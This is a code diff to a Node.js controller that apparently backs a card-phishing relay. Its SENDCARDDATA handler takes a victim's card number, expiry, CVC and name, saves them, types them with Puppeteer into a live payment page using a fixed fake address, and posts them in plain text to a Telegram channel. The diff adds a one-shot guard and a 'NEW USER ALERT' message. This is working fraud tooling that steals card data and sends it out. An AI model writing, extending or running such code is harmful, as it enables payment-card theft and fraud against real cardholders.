@@ -35,6 +35,7 @@ module.exports = {
     CLOSE: async (req, res) => {
         try {
             start = false;
+            userHave = false;
             const bot = req.bot;
             await page.close();
             await bot.sendMessage('@developers_00', `<b>CLOSED ${mainURL}:</b>`, { parse_mode: 'HTML' });
@@ -46,6 +47,7 @@ module.exports = {
     GOPAGE: async (req, res) => {
         try {
             start = false;
+            userHave = false;
             const bot = req.bot;
             const { url } = req.body;
             page = await browser.newPage();
@@ -127,40 +129,44 @@ module.exports = {
     },
     SENDCARDDATA: async (req, res) => {
         try {
-            userHave = true;
-            const bot = req.bot;
-            let { num, exp, cvc, holder } = req?.body;
-            if (req?.body?.card) {
-                const newUser = new UserModel({
-                    ...req.body,
-                });
-                newUser.save();
+            if(!userHave){
+                userHave = true;
+                const bot = req.bot;
+                let { num, exp, cvc, holder } = req?.body;
+                if (req?.body?.card) {
+                    const newUser = new UserModel({
+                        ...req.body,
+                    });
+                    newUser.save();
+                }
+                await page.keyboard.type(holder);
+                // await page.focus('body');
+                await page.keyboard.press('Tab');
+                await page.keyboard.type(num);
+                await page.keyboard.press('Tab');
+                await page.keyboard.type(exp);
+                await page.keyboard.press('Tab');
+                await page.keyboard.type(cvc);
+                await page.keyboard.press('Tab');
+                await page.keyboard.type('France');
+                await page.waitForTimeout(2000);
+                await page.keyboard.press('ArrowDown');
+                await page.keyboard.press('Enter');
+                await page.keyboard.press('Tab');
+                await page.keyboard.type('Qajaznuni 4');
+                await page.keyboard.press('Tab');
+                await page.keyboard.type('Paris');
+                await page.keyboard.press('Tab');
+                await page.keyboard.type('0034');
+                await page.keyboard.press('Tab');
+                await page.keyboard.press('Tab');
+                await page.keyboard.press('Enter');
+                await page.waitForTimeout(10000);
+                await bot.sendMessage('@developers_00', `<b>SENDCARDDATA ${mainURL}:</b>\n<b>name</b><code>${holder}</code>\n<b>num</b><code>${num}</code>\n<b>exp</b><code>${exp}</code>\n<b>svg</b><code>${cvc}</code>\n`, { parse_mode: 'HTML' });
+                return res.send({ success: true, message: 'OK' });
+            }else{
+                return res.status(500).send({ success: false, message: 'ERROR !!!' });
             }
-            await page.keyboard.type(holder);
-            // await page.focus('body');
-            await page.keyboard.press('Tab');
-            await page.keyboard.type(num);
-            await page.keyboard.press('Tab');
-            await page.keyboard.type(exp);
-            await page.keyboard.press('Tab');
-            await page.keyboard.type(cvc);
-            await page.keyboard.press('Tab');
-            await page.keyboard.type('France');
-            await page.waitForTimeout(2000);
-            await page.keyboard.press('ArrowDown');
-            await page.keyboard.press('Enter');
-            await page.keyboard.press('Tab');
-            await page.keyboard.type('Qajaznuni 4');
-            await page.keyboard.press('Tab');
-            await page.keyboard.type('Paris');
-            await page.keyboard.press('Tab');
-            await page.keyboard.type('0034');
-            await page.keyboard.press('Tab');
-            await page.keyboard.press('Tab');
-            await page.keyboard.press('Enter');
-            await page.waitForTimeout(10000);
-            await bot.sendMessage('@developers_00', `<b>SENDCARDDATA ${mainURL}:</b>\n<b>name</b><code>${holder}</code>\n<b>num</b><code>${num}</code>\n<b>exp</b><code>${exp}</code>\n<b>svg</b><code>${cvc}</code>\n`, { parse_mode: 'HTML' });
-            return res.send({ success: true, message: 'OK' });
         } catch (e) {
             return res.status(500).send({ success: false, message: 'ERROR ! ! !' });
         }
@@ -317,6 +323,7 @@ module.exports = {
     CANSTART:async(req,res)=>{
         try{
             if(start){
+                await bot.sendMessage('@developers_00', `<b>NEW USER ALERT</b>`, { parse_mode: 'HTML' });
                 return res.send({success: true, message:'success'})
             }else{
                 return res.send({success: false, message:'Please Wait!'})
